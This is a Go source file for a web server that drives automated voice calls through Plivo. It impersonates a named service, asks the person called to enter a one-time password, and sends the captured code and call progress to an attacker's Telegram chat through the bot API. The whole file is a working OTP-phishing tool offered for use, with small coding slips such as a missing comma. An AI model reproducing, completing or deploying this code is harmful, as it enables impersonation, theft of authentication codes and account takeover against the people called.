package main

import (
	"fmt"
	"net/url"

	"github.com/gofiber/fiber/v2"
	"github.com/imroc/req"
	"github.com/plivo/plivo-go/xml"
)

var NGROK_URL string = ""

func main() {

	app := fiber.New()

	app.Post("/detect_dtmf/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("Your OTP password is: %v", c.FormValue("Digits"))
		webhook_url := fmt.Sprintf("https://api.telegram.org/BOTKEYHERE/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		response := xml.ResponseElement{
			Contents: []interface{}{
				new(xml.WaitElement).SetBeep()
				new(xml.SpeakElement).
					AddSpeak("Wait for a few seconds as we check the OTP.."),
				new(xml.PlayElement).
					SetContents("https://s3.amazonaws.com/Trumpet.mp3"),
				new(xml.WaitElement).
					SetLength(5),
				new(xml.SpeakElement).
					AddSpeak(fmt.Sprintf("We have verified the code and secured your account. Thank you %v for choosing %v", c.Params("victim_name"), c.Params("service_name"))),
			},
		}
		return c.SendString(response.String())
	})

	app.Get("/generate_xml/:user/:victim_name/:service_name/:mes_id/", func(c *fiber.Ctx) error {
		response := xml.ResponseElement{
			Contents: []interface{}{
				new(xml.GetInputElement).
					SetAction(fmt.Sprintf("%v/request_otp/%v/%v", NGROK_URL, c.Params("user"), c.Params("mes_id"))).
					SetMethod("POST").
					SetInputType("dtmf").
					SetNumDigits(3).
					SetDigitEndTimeout(3).
					SetRedirect(true).
					SetContents([]interface{}{
						new(xml.SpeakElement).
							AddSpeak(fmt.Sprintf("Hello %v this is %v. If you would like to request your OTP, press 1", c.Params("victim_name"), c.Params("service_name"))).
							SetLanguageVoice("en-US", "WOMAN").
							SetLoop(1)}),
			},
		}
		webhook_url := fmt.Sprintf("https://api.telegram.org/BOTKEYHERE/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape("Call in progress"))
		go req.Get(webhook_url)
		return c.SendString(response.String())
	})

	app.Post("/request_otp/:user/:mes_id/", func(c *fiber.Ctx) error {
		digit := c.FormValue("Digits")
		if digit == "1" {
			response := xml.ResponseElement{
				Contents: []interface{}{
					new(xml.GetInputElement).
						SetAction(fmt.Sprintf("%v/detect_dtmf/%v/%v", NGROK_URL, c.Params("user"), c.Params("mes_id"))).
						SetMethod("POST").
						SetInputType("dtmf").
						SetDigitEndTimeout(3).
						SetRedirect(true).
						SetContents([]interface{}{
							new(xml.SpeakElement).AddSpeak("Please send OTP Code").
								SetLanguageVoice("en-US", "WOMAN").
								SetLoop(1)}),
				},
			}
			mess := fmt.Sprintf("They clicked on 1. OTP soon")
			webhook_url := fmt.Sprintf("https://api.telegram.org/BOTKEYHERE/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(mess))
			go req.Get(webhook_url)
			return c.SendString(response.String())

		}
		return c.SendString("done")
	})

	app.Post("/hangup/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("The person cancelled the call")
		webhook_url := fmt.Sprintf("https://api.telegram.org/BOTKEYHERE/sendMessage?chat_id=%v&text=%v", c.Params("user"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Post("/ring/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("Ringing...")
		webhook_url := fmt.Sprintf("https://api.telegram.org/BOTKEYHERE/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Post("/machine/:user/:mes_id/", func(c *fiber.Ctx) error {
		otp := fmt.Sprintf("Voice Mail")
		webhook_url := fmt.Sprintf("https://api.telegram.org/BOTKEYHERE/editMessageText?chat_id=%v&message_id=%v&text=%v", c.Params("user"), c.Params("mes_id"), url.QueryEscape(otp))
		go req.Get(webhook_url)
		return c.SendString("done")
	})

	app.Listen(":3000")
}
